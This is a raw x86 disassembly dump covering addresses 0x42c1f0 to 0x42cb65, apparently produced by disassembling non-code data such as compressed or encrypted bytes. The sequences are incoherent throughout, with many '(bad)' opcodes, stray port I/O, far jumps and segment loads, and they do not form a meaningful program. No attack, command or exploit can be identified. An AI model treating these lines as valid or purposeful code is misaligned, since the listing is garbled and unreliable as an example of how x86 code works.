  42c1f0:	loope  0x42c252
  42c1f2:	jns    0x42c1f8
  42c1f4:	out    0x60,al
  42c1f6:	and    edx,DWORD PTR [ebp+0x3f]
  42c1f9:	and    dl,BYTE PTR [edx-0x755a6904]
  42c1ff:	push   cs
  42c200:	lea    edi,[eax+0x2f]
  42c203:	fisubr DWORD PTR [edi]
  42c205:	fisub  DWORD PTR [edi+ebx*8]
  42c208:	lods   eax,DWORD PTR ds:[esi]
  42c209:	fcmovb st,st(3)
  42c20b:	jo     0x42c1cb
  42c20d:	fadd   QWORD PTR [eax+0xd590b0d]
  42c213:	or     DWORD PTR [eax],edi
  42c215:	xor    cl,bh
  42c217:	repz les ecx,FWORD PTR [ebp-0x57f48f89]
  42c21e:	mov    bl,0xbb
  42c220:	mov    dl,BYTE PTR [ebx-0x2d]
  42c223:	jl     0x42c1c9
  42c225:	mov    al,0x26
  42c227:	lahf   
  42c228:	push   edi
  42c229:	push   cs
  42c22a:	retf   0xd998
  42c22d:	dec    edx
  42c22e:	mov    ds:0xe85b6798,eax
  42c233:	loop   0x42c28b
  42c235:	or     ebp,eax
  42c237:	ja     0x42c226
  42c239:	mov    ecx,0x3b6f882a
  42c23e:	pop    esp
  42c23f:	out    dx,al
  42c240:	test   al,0x14
  42c242:	or     bl,BYTE PTR [edi-0x7]
  42c245:	or     DWORD PTR [esi+0x17],ebx
  42c248:	arpl   WORD PTR [eax+0x8dd0b67],si
  42c24e:	jb     0x42c25f
  42c250:	push   0x6d
  42c252:	std    
  42c253:	xor    al,0x9b
  42c255:	adc    DWORD PTR [eax+0x3476b20f],esi
  42c25b:	pop    ds
  42c25c:	mov    bh,cl
  42c25e:	mov    bh,0x23
  42c260:	sbb    bh,BYTE PTR [edi]
  42c262:	xchg   esp,eax
  42c263:	std    
  42c264:	xchg   BYTE PTR [esi-0x45],ch
  42c267:	outs   dx,BYTE PTR ds:[esi]
  42c268:	cmp    ebx,ecx
  42c26a:	je     0x42c2b6
  42c26c:	int3   
  42c26d:	adc    dh,BYTE PTR [eax]
  42c26f:	(bad)  
  42c271:	cdq    
  42c272:	xchg   esi,eax
  42c273:	xchg   esi,eax
  42c274:	add    bh,BYTE PTR [eax]
  42c276:	aad    0xb7
  42c278:	stos   BYTE PTR es:[edi],al
  42c279:	add    DWORD PTR [edi-0x48],esi
  42c27c:	push   eax
  42c27d:	fnstenv [edi-0x54]
  42c280:	mov    ebx,edx
  42c282:	pop    edi
  42c283:	pop    esi
  42c284:	gs das 
  42c286:	(bad)  [edi-0x66]
  42c289:	sub    BYTE PTR [eax+0x53],cl
  42c28c:	dec    esi
  42c28d:	shl    edx,cl
  42c28f:	ret    0x5728
  42c292:	ins    BYTE PTR es:[edi],dx
  42c293:	sub    esi,esp
  42c295:	or     edi,DWORD PTR [ebx]
  42c297:	iret   
  42c298:	fcomp  DWORD PTR [esi]
  42c29a:	rcl    esp,0xbf
  42c29d:	cdq    
  42c29e:	fisttp DWORD PTR [ebx+0x46188d0b]
  42c2a4:	mov    al,0x96
  42c2a6:	and    eax,DWORD PTR [ecx+0x3c]
  42c2a9:	or     BYTE PTR [ecx+edx*8-0x8],bl
  42c2ad:	dec    edi
  42c2ae:	in     eax,0x38
  42c2b0:	jo     0x42c25a
  42c2b2:	push   es
  42c2b3:	or     cl,BYTE PTR [esi]
	...
  42c315:	add    dh,ah
  42c317:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    esp,DWORD PTR [ebx*1-0x26fd6128]
  42c328:	add    DWORD PTR [eax],eax
  42c32a:	pop    es
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    ah,bl
  42c32f:	ins    BYTE PTR es:[edi],dx
  42c330:	inc    edi
  42c331:	mov    esi,0x11e62d56
  42c336:	add    BYTE PTR [edi-0xfc9f515],dh
  42c33c:	popa   
  42c33d:	aad    0xb8
  42c33f:	hlt    
  42c340:	xchg   edx,eax
  42c341:	xchg   esp,esi
  42c343:	cs or  eax,esi
  42c346:	loope  0x42c373
  42c348:	iret   
  42c349:	sub    bh,BYTE PTR ds:0x340d1377
  42c34f:	ror    esi,0xa8
  42c352:	pop    eax
  42c353:	push   ebx
  42c354:	mov    bl,0xc3
  42c356:	xor    al,0x93
  42c358:	sub    bh,BYTE PTR [esi+0x33]
  42c35b:	stc    
  42c35c:	cmp    eax,0x873b51c7
  42c361:	sub    BYTE PTR [esi-0x38f9cddb],al
  42c367:	outs   dx,BYTE PTR ds:[esi]
  42c368:	(bad)  
  42c369:	xchg   ecx,eax
  42c36a:	dec    ecx
  42c36b:	ins    BYTE PTR es:[edi],dx
  42c36c:	mov    ds:0x1c20edc1,eax
  42c371:	in     eax,0xa9
  42c373:	push   cs
  42c374:	std    
  42c375:	or     al,0x76
  42c377:	pop    ss
  42c378:	arpl   WORD PTR ds:0xfc9a96e,dx
  42c37e:	ds pop ebx
  42c380:	psubsw mm6,mm7
  42c383:	push   ss
  42c384:	sbb    al,0x5d
  42c386:	sbb    BYTE PTR ds:[ecx+ebx*8],0x57
  42c38b:	mov    WORD PTR [eax+0x51051e4f],fs
  42c391:	push   0xa8db2010
  42c396:	test   al,0x37
  42c398:	ret    
  42c399:	in     eax,0x87
  42c39b:	lock mov ah,BYTE PTR [esi]
  42c39e:	nop
  42c39f:	call   0xb70674e4
  42c3a4:	mov    edi,0x7a9c78c1
  42c3a9:	dec    esi
  42c3aa:	div    DWORD PTR [ecx-0x6f436c00]
  42c3b0:	mov    edx,?
  42c3b2:	cmp    dh,al
  42c3b4:	push   esi
  42c3b5:	int    0x6b
  42c3b7:	xchg   BYTE PTR [ebx+0x56d43aa0],cl
  42c3bd:	jnp    0x42c39a
  42c3bf:	push   ss
  42c3c0:	push   edi
  42c3c1:	rol    BYTE PTR [eax+0x47],0x8a
  42c3c5:	shl    BYTE PTR [esi-0x20],1
  42c3c8:	repz mov al,0xaa
  42c3cb:	xchg   esi,eax
  42c3cc:	lods   al,BYTE PTR ds:[esi]
  42c3cd:	inc    esp
  42c3ce:	push   es
  42c3cf:	xchg   ecx,eax
  42c3d0:	adc    eax,0x363b80d4
  42c3d5:	or     BYTE PTR [ecx+0x45],bl
  42c3d8:	icebp  
  42c3d9:	pushf  
  42c3da:	inc    edi
  42c3db:	xchg   DWORD PTR [esi+0x16],ecx
  42c3de:	jmp    0x42c3c0
  42c3e0:	ror    DWORD PTR [edi+0x5c],1
  42c3e3:	imul   ebx,DWORD PTR ds:0x414e0375,0x32
  42c3ea:	jg     0x42c433
  42c3ec:	mov    ds,ecx
  42c3ee:	mov    ss,edx
  42c3f0:	cmp    BYTE PTR [ebp-0x2442a2de],0x76
  42c3f7:	xor    BYTE PTR [ecx-0x3fbab5ad],0x63
  42c3fe:	shl    BYTE PTR [eax],1
  42c400:	ins    BYTE PTR es:[edi],dx
  42c401:	add    edi,edi
  42c403:	test   al,dh
  42c405:	and    ah,BYTE PTR [esi+0x47f09be7]
  42c40b:	cmp    BYTE PTR [ebx],al
  42c40d:	mov    al,BYTE PTR [edi+0x49]
  42c410:	lea    ebp,cs:[ecx+0x6974a729]
  42c417:	add    eax,0xb1a99371
  42c41c:	xor    BYTE PTR [ecx+0x29],0xf2
  42c420:	jo     0x42c3ff
  42c422:	outs   dx,DWORD PTR ds:[esi]
  42c423:	mov    esi,0x59b74315
  42c428:	mov    DWORD PTR [ebp+0x5f7ae9f5],edi
  42c42e:	mov    esp,0x222722b5
  42c433:	mov    esp,0x14
	...
  42c494:	add    BYTE PTR [eax],al
  42c496:	in     al,dx
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [ecx+0x9443673],bl
  42c4a7:	fiadd  DWORD PTR [ecx]
  42c4a9:	add    BYTE PTR [edi],al
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [ebx+0x53c600bf],bh
  42c4b3:	xor    al,dl
  42c4b5:	jecxz  0x42c4a2
  42c4b7:	pop    ecx
  42c4b8:	fld    TBYTE PTR [edi]
  42c4ba:	add    BYTE PTR [ebx-0x5e],ch
  42c4bd:	sti    
  42c4be:	mov    ah,0x9c
  42c4c0:	ja     0x42c45c
  42c4c2:	fld    DWORD PTR [edx+0x95eef23]
  42c4c8:	fwait
  42c4c9:	out    dx,eax
  42c4ca:	sahf   
  42c4cb:	add    DWORD PTR [edi+edx*2],edx
  42c4ce:	mov    cl,0x61
  42c4d0:	fist   WORD PTR [eax-0x59d752f4]
  42c4d6:	add    BYTE PTR [eax+0x63],0xc
  42c4da:	into   
  42c4db:	pop    edi
  42c4dc:	jbe    0x42c4d9
  42c4de:	sub    DWORD PTR [ebp-0x38],0xf5115436
  42c4e5:	in     eax,dx
  42c4e6:	sbb    eax,0x1752d4f5
  42c4eb:	jnp    0x42c49e
  42c4ed:	and    DWORD PTR [ebx-0x3d],0xfffffffd
  42c4f1:	es mov esi,0xf72a83dd
  42c4f7:	and    eax,0xe110ce6f
  42c4fc:	jmp    0x42c4b8
  42c4fe:	fsub   QWORD PTR [edi]
  42c500:	imul   edx,DWORD PTR [eax-0x10],0x1d8067bb
  42c507:	adc    al,0xf1
  42c509:	mov    ah,0xeb
  42c50b:	adc    DWORD PTR [ebx],ecx
  42c50d:	idiv   eax
  42c50f:	xchg   BYTE PTR [ecx-0x23],dl
  42c512:	out    dx,al
  42c513:	jns    0x42c57a
  42c515:	dec    edx
  42c516:	ja     0x42c517
  42c518:	mov    DWORD PTR [eax],edi
  42c51a:	jp     0x42c4d3
  42c51c:	adc    bl,BYTE PTR [ebp+0x3a7d2c14]
  42c522:	cwde   
  42c523:	pusha  
  42c524:	inc    esi
  42c525:	xor    al,0xba
  42c527:	mov    al,bl
  42c529:	sbb    ebp,esi
  42c52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c52c:	xchg   edx,eax
  42c52d:	ins    DWORD PTR es:[edi],dx
  42c52e:	sbb    BYTE PTR [edx+eiz*2],al
  42c531:	gs xor al,0x75
  42c534:	scas   eax,DWORD PTR es:[edi]
  42c535:	inc    ebp
  42c536:	mov    edx,0x6fc65224
  42c53b:	inc    esp
  42c53c:	mov    dh,0xd1
  42c53e:	jge    0x42c4cd
  42c540:	dec    ebx
  42c541:	and    al,0x57
  42c543:	dec    esp
  42c544:	aam    0x18
  42c546:	sar    BYTE PTR [edx+0x45f9f3c2],1
  42c54c:	xor    eax,0xfabc9108
  42c551:	jecxz  0x42c5cb
  42c553:	dec    ebx
  42c554:	pusha  
  42c555:	mov    al,0x8c
  42c557:	ficomp WORD PTR [ebx]
  42c559:	int3   
  42c55a:	jl     0x42c5c6
  42c55c:	iret   
  42c55d:	xor    al,0xbe
  42c55f:	push   eax
  42c560:	repnz push ds
  42c562:	shl    BYTE PTR ds:0x57ee1243,1
  42c568:	cld    
  42c569:	icebp  
  42c56a:	mov    ecx,0xc704b4c3
  42c56f:	jns    0x42c578
  42c571:	gs dec ebp
  42c573:	les    esp,FWORD PTR [ebp+0x5c]
  42c576:	or     BYTE PTR [esp+edx*2-0x44],ch
  42c57a:	mov    dh,0xb8
  42c57c:	sbb    BYTE PTR [eax-0x3f44c691],ah
  42c582:	icebp  
  42c583:	je     0x42c574
  42c585:	retf   
  42c586:	mov    eax,ds:0xdae6edd4
  42c58b:	jl     0x42c55b
  42c58d:	mov    ds,WORD PTR [eax+0x3c555a3f]
  42c593:	aaa    
  42c594:	out    dx,eax
  42c595:	inc    esp
  42c596:	into   
  42c597:	pop    ss
  42c598:	xlat   BYTE PTR ds:[ebx]
  42c599:	and    eax,0xd51d1cdc
  42c59e:	push   edx
  42c59f:	cld    
  42c5a0:	cdq    
  42c5a1:	inc    edx
  42c5a2:	push   edx
  42c5a3:	loopne 0x42c611
  42c5a5:	push   ebx
  42c5a6:	xor    bh,BYTE PTR [esi-0x5e95f45]
  42c5ac:	fisubr DWORD PTR [edx]
  42c5ae:	push   ebp
  42c5af:	add    dh,BYTE PTR [ecx+0x79113a27]
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	loop   0x42c668
  42c624:	push   cs
  42c625:	out    0x10,al
  42c627:	fild   DWORD PTR [ecx]
  42c629:	add    BYTE PTR [edi],al
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    ah,bh
  42c62f:	pusha  
  42c630:	jns    0x42c5b5
  42c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c633:	adc    DWORD PTR [eax],ebp
  42c635:	(bad)  
  42c636:	out    dx,eax
  42c637:	lea    esi,[ebp+0x3003dbb7]
  42c63d:	sbb    ah,BYTE PTR [eax*2+0x74cf2976]
  42c644:	adc    eax,0x88120d0d
  42c649:	xor    eax,0xcb44918e
  42c64e:	mov    ds:0x27be9280,eax
  42c653:	jo     0x42c5e9
  42c655:	mov    dh,0x49
  42c657:	pop    esp
  42c658:	cmp    ah,dl
  42c65a:	jo     0x42c6ad
  42c65c:	xchg   esi,eax
  42c65d:	jecxz  0x42c6b7
  42c65f:	ror    BYTE PTR [eax+eax*4-0x7b4811d8],1
  42c666:	(bad)
  42c66b:	push   ss
  42c66c:	sub    esi,DWORD PTR [edx-0x2]
  42c66f:	hlt    
  42c670:	fnstenv [ebp+0x3d]
  42c673:	sub    bh,al
  42c675:	das    
  42c676:	pop    edx
  42c677:	xchg   ecx,eax
  42c678:	xchg   esi,eax
  42c679:	add    DWORD PTR [ebp+eiz*8-0x30],esi
  42c67d:	(bad)  
  42c67f:	int3   
  42c680:	pop    ecx
  42c681:	jb     0x42c61e
  42c683:	xchg   ecx,eax
  42c684:	inc    ecx
  42c685:	(bad)  
  42c686:	stc    
  42c687:	and    edi,DWORD PTR [eax]
  42c689:	dec    esp
  42c68a:	mov    ch,BYTE PTR [edx-0x34e3885]
  42c690:	jb     0x42c6f3
  42c692:	mov    ecx,0xb7465570
  42c697:	js     0x42c68e
  42c699:	retf   
  42c69a:	sbb    dh,BYTE PTR [eax]
  42c69c:	xor    al,0x69
  42c69e:	aas    
  42c69f:	pop    ss
  42c6a0:	imul   edi,esp,0xffffffd4
  42c6a3:	loop   0x42c679
  42c6a5:	xchg   ebp,eax
  42c6a6:	add    DWORD PTR [ecx+0x18747afa],eax
  42c6ac:	jg     0x42c711
  42c6ae:	adc    edx,DWORD PTR [ebx-0x67]
  42c6b1:	mov    cs,WORD PTR [eax-0x2b935a0]
  42c6b7:	mov    ds:0xbb126fa3,eax
  42c6bc:	repnz fs mov dl,0x56
  42c6c0:	dec    ecx
  42c6c1:	push   edi
  42c6c2:	scas   eax,DWORD PTR es:[edi]
  42c6c3:	loop   0x42c6af
  42c6c5:	adc    eax,edi
  42c6c7:	in     eax,dx
  42c6c8:	mov    cl,0x62
  42c6ca:	adc    al,0xc3
  42c6cc:	xor    esp,DWORD PTR [esp+eax*1-0x4a]
  42c6d0:	cdq    
  42c6d1:	call   0x7967a3bb
  42c6d6:	rcr    esi,1
  42c6d8:	push   0x6c
  42c6da:	ins    DWORD PTR es:[edi],dx
  42c6db:	rol    dh,1
  42c6dd:	scas   al,BYTE PTR es:[edi]
  42c6de:	mov    ah,0xd1
  42c6e0:	aaa    
  42c6e1:	icebp  
  42c6e2:	aad    0x84
  42c6e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6e5:	mov    BYTE PTR [eax-0x541cd4b9],ch
  42c6eb:	test   al,0x90
  42c6ed:	mov    ah,0x8d
  42c6ef:	xchg   edx,eax
  42c6f0:	sub    eax,0xf85db8a
  42c6f5:	sar    DWORD PTR ds:0xb1d9dc3f,cl
  42c6fb:	mov    bh,0xa
  42c6fd:	outs   dx,BYTE PTR ds:[esi]
  42c6fe:	arpl   WORD PTR [edx+0x1288f9f],bp
  42c704:	adc    al,0x44
  42c706:	cdq    
  42c707:	test   al,0x5f
  42c709:	rcl    DWORD PTR [edi+0x3efdc96b],0x19
  42c710:	outs   dx,DWORD PTR ds:[esi]
  42c711:	cmp    cl,BYTE PTR [ebp-0x37291fc]
  42c717:	pushf  
  42c718:	addr16 popf 
  42c71a:	mov    al,0xca
  42c71c:	cmp    eax,0x7b077693
  42c721:	mov    bh,0x4d
  42c723:	bound  ebx,QWORD PTR [ecx+edx*2]
  42c726:	add    al,0xa3
  42c728:	xchg   BYTE PTR [ebp*2-0x5f845ea3],al
  42c72f:	jb     0x42c770
  42c731:	adc    ah,bl
  42c733:	add    ecx,DWORD PTR [eax+0x0]
	...
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0xcfec3f90
  42c7a4:	pop    edx
  42c7a5:	dec    esp
  42c7a6:	pop    ss
  42c7a7:	fadd   QWORD PTR [ecx]
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [ebp-0x57],dh
  42c7b0:	retf   
  42c7b1:	cmp    bh,bh
  42c7b3:	dec    edx
  42c7b4:	test   DWORD PTR [edi+ebp*4+0x25ed67ed],eax
  42c7bb:	loop   0x42c78d
  42c7bd:	cmp    eax,0x11427bb1
  42c7c2:	mov    edi,0xb15b96ad
  42c7c7:	jmp    0x42c807
  42c7c9:	aam    0x8f
  42c7cb:	aas    
  42c7cc:	or     al,BYTE PTR [edx]
  42c7ce:	push   eax
  42c7cf:	sub    BYTE PTR [esi+ebp*1-0xb302ef5],ch
  42c7d6:	test   eax,0x7d172d8b
  42c7db:	imul   edi,DWORD PTR [esi-0x4829a796],0xffffffd8
  42c7e2:	push   esp
  42c7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7e4:	inc    ebp
  42c7e5:	loop   0x42c803
  42c7e7:	inc    esp
  42c7e8:	jmp    0x42c7c9
  42c7ea:	mov    edi,0xbcc31dea
  42c7ef:	pop    esp
  42c7f0:	test   al,0xc1
  42c7f2:	pop    ds
  42c7f3:	fcmovnbe st,st(3)
  42c7f5:	inc    edx
  42c7f6:	and    bl,dl
  42c7f8:	das    
  42c7f9:	imul   edi,DWORD PTR [edi+0xe],0x42
  42c7fd:	xor    ecx,DWORD PTR [edx+0x6c]
  42c800:	xchg   esp,eax
  42c801:	adc    al,0x2e
  42c803:	addr16 maskmovq mm4,(bad)
  42c805:	mul    DWORD PTR [ebx-0x74391dfa]
  42c80b:	out    dx,eax
  42c80c:	int    0x8e
  42c80e:	call   0xd2193de
  42c813:	std    
  42c814:	jmp    0xbf6b:0x6de4e077
  42c81b:	add    cl,BYTE PTR [esi+ebp*1-0xb]
  42c81f:	dec    eax
  42c820:	dec    esp
  42c821:	jns    0x42c863
  42c823:	test   DWORD PTR [esi+eiz*4-0x6f6bd620],ebp
  42c82a:	mov    bh,0x9f
  42c82c:	retf   
  42c82d:	jl     0x42c873
  42c82f:	(bad)  
  42c831:	jno    0x42c835
  42c833:	mov    edx,0x87f352cd
  42c838:	fistp  DWORD PTR [ebx+0x7f]
  42c83b:	hlt    
  42c83c:	aad    0x1d
  42c83e:	pop    ecx
  42c83f:	in     eax,dx
  42c840:	fninit 
  42c842:	and    edi,DWORD PTR [ecx+0x6f5acf5c]
  42c848:	aad    0x5d
  42c84a:	fstp   DWORD PTR [edi+edx*8+0x30fcf2b7]
  42c851:	(bad)  
  42c852:	outs   dx,DWORD PTR ds:[esi]
  42c853:	xchg   esi,eax
  42c854:	ret    0xf399
  42c857:	stos   DWORD PTR es:[edi],eax
  42c858:	data16 sbb BYTE PTR [ecx],cl
  42c85b:	inc    esp
  42c85c:	rcl    dl,cl
  42c85e:	push   esp
  42c85f:	or     al,0x28
  42c861:	sbb    al,0x1d
  42c863:	add    ch,BYTE PTR [eax+edi*8]
  42c866:	xor    bh,BYTE PTR [edi-0x4d]
  42c869:	pop    es
  42c86a:	fisttp QWORD PTR [edi]
  42c86c:	icebp  
  42c86d:	inc    esp
  42c86e:	pusha  
  42c86f:	jns    0x42c8ba
  42c871:	xor    edx,DWORD PTR [edx+0x29]
  42c874:	push   ebp
  42c875:	mov    ch,0x5e
  42c877:	mov    ebx,0xdb29aa5a
  42c87c:	jno    0x42c832
  42c87e:	dec    edx
  42c87f:	shl    cl,1
  42c881:	nop
  42c882:	pushf  
  42c883:	add    esp,edi
  42c885:	xchg   edx,eax
  42c886:	push   edx
  42c887:	mov    edx,DWORD PTR [eax-0x2c45c81a]
  42c88d:	mov    al,0xf0
  42c88f:	ss loop 0x42c852
  42c892:	nop
  42c893:	and    dl,cl
  42c895:	(bad)  
  42c896:	cmc    
  42c897:	mov    ecx,0x588a7255
  42c89c:	jbe    0x42c863
  42c89e:	sti    
  42c89f:	push   edi
  42c8a0:	and    ebp,DWORD PTR [esi]
  42c8a2:	addr16 test eax,0xeb679672
  42c8a8:	adc    bl,0xce
  42c8ab:	pusha  
  42c8ac:	jle    0x42c84c
  42c8ae:	ret    0xcce6
  42c8b1:	(bad)  
  42c8b2:	lock pop DWORD PTR cs:[eax]
	...
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	xchg   esi,eax
  42c923:	jg     0x42c947
  42c925:	xor    bl,BYTE PTR [esi]
  42c927:	fld    QWORD PTR [ecx]
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [edx-0x3772d614],cl
  42c933:	xor    BYTE PTR [eax],ah
  42c935:	inc    ebp
  42c936:	out    0x5f,eax
  42c938:	mov    esi,edx
  42c93a:	pop    esi
  42c93b:	shl    DWORD PTR [eax+eiz*4],1
  42c93e:	ficomp WORD PTR [ecx]
  42c940:	mov    ebp,0x2cdc866b
  42c945:	ret    0xb03
  42c948:	push   cs
  42c949:	popf   
  42c94a:	sbb    edx,DWORD PTR ds:0x48fee685
  42c950:	rcr    ch,1
  42c952:	xor    DWORD PTR [edx+0x699e0778],edx
  42c958:	lods   al,BYTE PTR ds:[esi]
  42c959:	test   al,0xe3
  42c95b:	adc    DWORD PTR [ebx+0x52],ecx
  42c95e:	scas   eax,DWORD PTR es:[edi]
  42c95f:	cmp    al,0xe4
  42c961:	(bad)  
  42c962:	sbb    bh,BYTE PTR [ecx+0x7a]
  42c965:	sub    al,0xe3
  42c967:	pop    edx
  42c968:	loopne 0x42c93b
  42c96a:	adc    eax,DWORD PTR [ecx]
  42c96c:	(bad)  
  42c96e:	sbb    BYTE PTR [edi],ch
  42c970:	out    dx,eax
  42c971:	(bad)  
  42c972:	xchg   esp,eax
  42c973:	retf   0x548b
  42c976:	dec    ebp
  42c977:	mov    ecx,0x9ef668e1
  42c97c:	xchg   cl,ch
  42c97e:	adc    DWORD PTR [esi+0x7e65999b],ebp
  42c984:	mov    bh,0x42
  42c986:	repz imul eax,DWORD PTR [ebx+0x6],0xffffffe6
  42c98b:	clc    
  42c98c:	nop
  42c98d:	or     BYTE PTR [ebx+ebx*1],0x7e
  42c991:	aad    0x1f
  42c993:	loope  0x42c9f8
  42c995:	inc    ebp
  42c996:	and    eax,0x29276d4c
  42c99b:	and    eax,DWORD PTR [edx]
  42c99d:	push   ecx
  42c99e:	jp     0x42c955
  42c9a0:	stos   DWORD PTR es:[edi],eax
  42c9a1:	stos   BYTE PTR es:[edi],al
  42c9a2:	mov    ds:0xb1d9b470,al
  42c9a7:	(bad)  
  42c9a8:	rcl    DWORD PTR [esi+0x7c98bd14],cl
  42c9ae:	push   es
  42c9af:	push   eax
  42c9b0:	inc    edi
  42c9b1:	test   BYTE PTR [edi-0xb01e978],bl
  42c9b7:	sub    DWORD PTR [edi-0x73],ecx
  42c9ba:	imul   edx,DWORD PTR [ebx-0x2b],0x90863ab3
  42c9c1:	push   edx
  42c9c2:	push   cs
  42c9c3:	shl    BYTE PTR [eax],1
  42c9c5:	jge    0x42c9d9
  42c9c7:	xchg   DWORD PTR [ecx],esp
  42c9c9:	or     DWORD PTR [esi+0x40e9e08f],esp
  42c9cf:	add    ebp,DWORD PTR [eax-0x3]
  42c9d2:	jns    0x42ca29
  42c9d4:	xchg   edx,eax
  42c9d5:	sahf   
  42c9d6:	and    ecx,eax
  42c9d8:	add    DWORD PTR [ebx-0x7a5398c3],ebp
  42c9de:	aaa    
  42c9df:	clc    
  42c9e0:	not    DWORD PTR [ebx+eax*1+0x71ae9e4e]
  42c9e7:	mov    WORD PTR [eax+ebx*4-0x7733d23b],ds
  42c9ee:	add    DWORD PTR [ecx],ecx
  42c9f0:	loopne 0x42ca3e
  42c9f2:	pop    fs
  42c9f4:	and    al,0x2f
  42c9f6:	sub    al,0xec
  42c9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9f9:	enter  0xb39,0x9b
  42c9fd:	jle    0x42c9c3
  42c9ff:	(bad)  
  42ca01:	or     eax,0xd21c5e59
  42ca06:	xchg   BYTE PTR [eax+0x40],al
  42ca09:	adc    al,0x72
  42ca0b:	rcr    BYTE PTR [ebp-0x29ad21c4],0x24
  42ca12:	retf   0x5436
  42ca15:	ins    BYTE PTR es:[edi],dx
  42ca16:	inc    edi
  42ca17:	imul   edx,DWORD PTR [ecx-0x293ef1df],0xffffffe6
  42ca1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca1f:	int    0x37
  42ca21:	sar    BYTE PTR [eax-0x49513060],cl
  42ca27:	add    BYTE PTR [edx+0x41],al
  42ca2a:	in     al,0x48
  42ca2c:	sub    ebp,DWORD PTR [edi+0x63a197c4]
  42ca32:	adc    eax,0x2209
	...
  42ca93:	add    BYTE PTR [eax],al
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0xe7bde3fa,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [eax-0x156cd1ca],al
  42cab3:	adc    esi,edx
  42cab5:	pusha  
  42cab6:	inc    esi
  42cab7:	mov    ch,0x8e
  42cab9:	push   ecx
  42caba:	or     bl,BYTE PTR [ecx]
  42cabc:	fld    TBYTE PTR [edx]
  42cabe:	gs aas 
  42cac0:	inc    ebp
  42cac1:	jnp    0x42cb13
  42cac3:	imul   edi,DWORD PTR [edx],0xffffffdc
  42cac6:	(bad)  
  42cac7:	call   0x2a9:0x1873c74c
  42cace:	cdq    
  42cacf:	hlt    
  42cad0:	push   eax
  42cad1:	xlat   BYTE PTR ds:[ebx]
  42cad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cad3:	cmp    al,0x5b
  42cad5:	mov    al,ds:0xc888093a
  42cada:	mov    BYTE PTR [edx],dl
  42cadc:	xchg   edi,edi
  42cade:	pop    eax
  42cadf:	dec    esi
  42cae0:	stos   DWORD PTR es:[edi],eax
  42cae1:	popa   
  42cae2:	fdivr  QWORD PTR [eax+0x4f]
  42cae5:	mov    ebx,0xa3497b18
  42caea:	ffreep st(1)
  42caec:	xchg   edi,eax
  42caed:	sub    BYTE PTR [edx],dh
  42caef:	jg     0x42ca94
  42caf1:	jo     0x42cac5
  42caf3:	sub    DWORD PTR [esi+0x3c223a75],esi
  42caf9:	xor    eax,0x253a9327
  42cafe:	cs pop ebp
  42cb00:	shl    BYTE PTR [ecx+0x23],cl
  42cb03:	stc    
  42cb04:	or     dh,0x99
  42cb07:	(bad)  
  42cb08:	fisttp WORD PTR [esi-0x6b]
  42cb0b:	ret    
  42cb0c:	ret    
  42cb0d:	pand   mm3,QWORD PTR [ebx+ebx*8]
  42cb11:	jp     0x42cb4f
  42cb13:	out    dx,al
  42cb14:	pop    ds
  42cb15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb16:	cmp    eax,0x7c81ce05
  42cb1b:	jb     0x42cafe
  42cb1d:	and    BYTE PTR [ecx+edx*2],ah
  42cb20:	lods   eax,DWORD PTR ds:[esi]
  42cb21:	gs (bad) 
  42cb23:	fbld   TBYTE PTR ds:0x8f50d483
  42cb29:	clc    
  42cb2a:	inc    BYTE PTR [edi]
  42cb2c:	jb     0x42cb18
  42cb2e:	or     al,0xd1
  42cb30:	jnp    0x42cae8
  42cb32:	xchg   ebx,eax
  42cb33:	mov    eax,0x4aa68ad8
  42cb38:	retf   
  42cb39:	pop    es
  42cb3a:	loop   0x42cadf
  42cb3c:	mov    ch,0xc0
  42cb3e:	aad    0x6b
  42cb40:	dec    ecx
  42cb41:	(bad)  
  42cb42:	neg    DWORD PTR [ebp-0x58]
  42cb45:	dec    ebx
  42cb46:	sub    al,0x81
  42cb48:	(bad)  
  42cb49:	mov    esi,0x32df136b
  42cb4e:	mov    ah,0xb7
  42cb50:	mov    ss,WORD PTR [edi-0x51]
  42cb53:	pop    ds
  42cb54:	enter  0x8763,0xe
  42cb58:	sub    al,0xb3
  42cb5a:	rcr    DWORD PTR [ebx+0x13],0xa2
  42cb5e:	test   BYTE PTR [ebp+0x49],ah
  42cb61:	aad    0xc2
  42cb63:	outs   dx,BYTE PTR ds:[esi]
  42cb64:	xchg   esi,eax
  42cb65:	jb     0x42cbe0
